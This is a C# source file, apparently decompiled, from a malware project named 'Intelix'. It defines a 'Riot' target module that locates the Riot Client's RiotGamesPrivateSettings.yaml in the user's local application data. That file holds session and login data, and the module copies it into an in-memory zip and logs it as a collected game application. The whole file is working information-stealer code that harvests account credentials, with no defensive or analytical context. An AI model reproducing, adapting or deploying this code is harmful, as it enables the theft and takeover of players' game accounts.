using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games
{
	// Token: 0x02000028 RID: 40
	public class Riot : ITarget
	{
		// Token: 0x06000073 RID: 115 RVA: 0x00005504 File Offset: 0x00003704
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
				"Riot Games",
				"Riot Client",
				"Data",
				"RiotGamesPrivateSettings.yaml"
			});
			bool flag = File.Exists(text);
			if (flag)
			{
				string text2 = Path.Combine("Riot", "RiotGamesPrivateSettings.yaml");
				zip.AddFile(text2, File.ReadAllBytes(text));
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Riot";
				counterApplications.Files.Add(text + " => " + text2);
				counter.Games.Add(counterApplications);
			}
		}
	}
}
